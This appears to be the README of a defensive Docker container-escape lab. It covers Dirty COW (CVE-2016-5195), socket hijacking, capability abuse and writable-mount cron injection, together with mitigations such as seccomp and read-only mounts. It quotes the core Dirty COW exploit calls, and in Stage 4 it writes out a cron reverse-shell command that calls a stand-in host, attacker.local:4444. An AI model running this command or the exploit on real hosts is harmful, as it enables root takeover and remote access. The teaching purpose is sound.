#  Hexa Force: Container Security & DevSecOps Laboratory
### *A Widescreen 4-Stage Attack, Detection, and Mitigation Laboratory (CVE-2016-5195 & Escape Boundaries)*

This repository provides a highly comprehensive, end-to-end hands-on laboratory designed to demonstrate, analyze, and mitigate the four primary security boundary escape vectors in Docker container environments. Developed by **Hexa Force**, this laboratory provides a complete attack-defense lifecycle across all key container isolation boundaries, fully integrated with automated DevSecOps pipelines and system-level syscall hardening.

---

## 4 Security Pillars of Containerization

Containers achieve performance and portability by sharing host resources. However, weak runtime permissions or unpatched host kernels can escalate local compromises into total physical host infrastructure takeovers. This lab explores and validates the four crucial pillars of container security:

| Stage | Security Pillar | Exploit Vector / Simulation | Primary Defense & Mitigation |
| :--- | :--- | :--- | :--- |
| **Stage 1** | **Host Kernel Isolation** | Exploit the **Dirty COW** (CVE-2016-5195) race condition using thread timing to overwrite a read-only root file (`/var/secret/target.txt`). | Keep host Linux kernel patched; utilize secure user-space micro-VM container runtimes (e.g., **gVisor** or **Kata Containers**). |
| **Stage 2** | **Process Boundaries** | Abuse over-privileged capabilities (`CAP_SYS_ADMIN`) inside the container to alter namespace states and access mounting layers. | Drop all default capabilities (`--cap-drop=ALL`) and strictly avoid privileged contexts in untrusted containers. |
| **Stage 3** | **Engine API Security** | Detect and hijack an exposed Docker socket (`/var/run/docker.sock`) to issue direct HTTP API queries, spawning high-privilege sibling containers on the host. | Never mount the Docker socket in user containers; migrate daemon configurations to **Rootless Mode** or deploy secure API proxies. |
| **Stage 4** | **Volume & Storage Bounds** | Exploit writable sensitive host directory mounts (e.g., `/mnt/host/etc/cron.d`) to perform path traversal writes, injecting cron reverse shells. | Mount all host directory volumes strictly as read-only (`:ro`); prohibit mounting root host directories (`/etc`, `/root`, `/var`). |

---

##  Laboratory Repository Contents

This workspace contains exploit source code, orchestration scripts, automated CI/CD configurations, custom syscall security filters, and programmatic widescreen presentation builders:

###  Core Lab Environment
*   [`Dockerfile`](file:///d:/Dirty%20cow%20Docker/Dockerfile): Configures the container base, sets up an unprivileged system user `victim`, establishes read-only root targets, and models socket/volume interfaces.
*   [`dirtyc0w.c`](file:///d:/Dirty%20cow%20Docker/dirtyc0w.c): A highly optimized C implementation of the CVE-2016-5195 race condition exploit using `mmap()`, `madvise(MADV_DONTNEED)`, and `/proc/self/mem` writing threads.
*   [`run_demo.sh`](file:///d:/Dirty%20cow%20Docker/run_demo.sh): The core Hexa Force orchestrator. Displays real-time container diagnostics, compiles and runs the Dirty COW exploit, models Stage 2-4 boundary violations, highlights detection indicators, and outlines remediation steps.

###  System-Level Syscall Hardening
*   [`hexaforce-seccomp.json`](file:///d:/Dirty%20cow%20Docker/hexaforce-seccomp.json): A production-grade custom **Seccomp (Secure Computing Mode)** security profile. It explicitly blocks the `madvise` system call, neutralizing the kernel race condition.

###  Automated DevSecOps Pipelines with Trivy & Cosign (Sigstore)
*   [`.github/workflows/dirtycow-lab.yml`](file:///d:/Dirty%20cow%20Docker/.github/workflows/dirtycow-lab.yml): The GitHub Actions CI/CD configuration:
    1. Builds the image locally.
    2. Runs an automated **AquaSec Trivy** static vulnerability scan on the built image.
    3. Pushes the verified image securely to the GitHub Container Registry (`ghcr.io`).
    4. Cryptographically signs the image keylessly using **Cosign (Sigstore)** via OIDC token federation.
    5. Runs all four lab stages sequentially on the signed image.

###  Programmatic Slide & Guide Builders
*   **Generated Decks & Guides**: 
    *   [`Hexa_Force_Secure_Lab_Presentation.pptx`](file:///d:/Dirty%20cow%20Docker/Hexa_Force_Secure_Lab_Presentation.pptx) (11-slide lab overview)
    *   [`Dirty_COW_Technical_Briefing.pptx`](file:///d:/Dirty%20cow%20Docker/Dirty_COW_Technical_Briefing.pptx) (16-slide technical deep dive)
    *   [`Hexa_Force_Secure_Lab_Guide.docx`](file:///d:/Dirty%20cow%20Docker/Hexa_Force_Secure_Lab_Guide.docx) (Detailed laboratory guide manual)

---

##  How to Run the Laboratory

Ensure you have **Docker** running on your host system, then execute the following commands in your shell:

### Step 1: Build the Container
Compile the secure, low-privileged environment:
```powershell
docker build -t dirtycow-lab .
```

### Step 2: Run the Hexa Force Orchestrator
Execute the container. By default, it will run all 4 stages sequentially:
```powershell
docker run --rm -it dirtycow-lab
```

### Step 3: Run Modular Stages (Optional)
You can target and analyze specific isolation boundaries individually by appending command-line flags:
```powershell
# Run only Stage 1: Dirty COW Exploit
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-1

# Run only Stage 2: Capability & Process Isolation Diagnostic
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-2

# Run only Stage 3: Exposed Docker Socket Simulation
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-3

# Run only Stage 4: Volume Cron Path Traversal Simulation
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-4
```

---

##  Advanced Hardening: Restricting System Calls via Seccomp

To prevent the Dirty COW exploit from executing even on an unpatched vulnerable kernel, run your container using the custom **Seccomp** security profile provided in this repository:

```powershell
docker run --rm -it --security-opt seccomp=hexaforce-seccomp.json dirtycow-lab
```

> [!TIP]
> **How it Works**: The Seccomp profile blocks the `madvise` system call, returning an `EPERM` (Operation not permitted) error code to the caller. When the `dirtyc0w` binary attempts to run, Thread 1 (the discard thread) will instantly fail to clear virtual page mappings, completely neutralizing the race condition.

---

##  Deep-Dive: Under-the-Hood Exploit Flows

### 1. Stage 1: Dirty COW Memory Corruption (CVE-2016-5195)
1. **Memory Mapping**: The C exploit opens a target file read-only, mapping it into virtual memory as a private, Copy-on-Write mapping:
   ```c
   map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
   ```
2. **The Discard Thread**: Loops continuously, advising the kernel that the physical page holding the mapped file content is no longer needed:
   ```c
   madvise(map, 100, MADV_DONTNEED);
   ```
3. **The Write Thread**: Concurrently opens its process's virtual memory space (`/proc/self/mem`) and writes to the mapped range:
   ```c
   lseek(f, map, SEEK_SET);
   write(f, payload, len);
   ```
4. **The Race Condition**:
   * The kernel processes the write, sees that the page is read-only, and initiates a COW (Copy-On-Write) operation to copy it to a private, writeable physical frame.
   * Right before the new private page table mapping is committed, the Discard Thread triggers `madvise()`. The kernel throws away the newly allocated page frame mid-operation.
   * Due to non-atomic execution retry, the write resumes but now maps to the **original, global read-only page cache**, modifying the actual file on disk.

### 2. Stage 4: Volume Path Traversal & Cron Injection
1. **Writable Mounts**: A host directory mount is mapped into the container environment.
2. **Exploit Vector**: An attacker attempts to write an execution task into `/mnt/host/etc/cron.d`:
   ```bash
   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.local/4444 0>&1'" > /mnt/host/etc/cron.d/exploit_task
   ```
3. **Defense Verification**: If correctly configured as a read-only (`:ro`) mount, the system rejects the operation with a standard `Permission Denied` code. The orchestrator catches this rejection and confirms a **Successfully Defended** state.

---

##  Re-Generating Presentations & Handbooks

If you wish to customize or rebuild the PowerPoint slide decks or Word guides, make sure you have Python installed, install the required packages, and execute the scripts:

```powershell
# 1. Install prerequisites
pip install python-pptx python-docx

 
```

---

##  DevSecOps Workload Hardening Checklist

To protect production clusters and secure Docker environments against container escapes:
*   [x] **Apply Host Kernel Patches**: Keeping the underlying host OS kernel fully updated is the absolute foundation of container cluster security.
*   [x] **Deploy Syscall Filters (Seccomp)**: Restrict system calls like `madvise` using custom Seccomp profiles (`hexaforce-seccomp.json`) to block kernel race exploits.
*   [x] **Drop Default Linux Capabilities**: Strip container capability profiles to a minimal list, ensuring `CAP_SYS_ADMIN` is dropped.
*   [x] **Enforce Read-Only Filesystems**: Mount all integration and data volumes strictly as read-only (`ro` flag) wherever write operations are unnecessary.
*   [x] **Prohibit UNIX Socket Mounts**: Never mount `/var/run/docker.sock` in unverified user workloads.
*   [x] **Configure Non-Root Runtimes**: Switch away from the default root account inside Dockerfiles using the `USER <username>` directive.
*   [x] **Automate Container Scanning**: Run static vulnerability scanners (Trivy) in the CI/CD pipeline before signing container images.
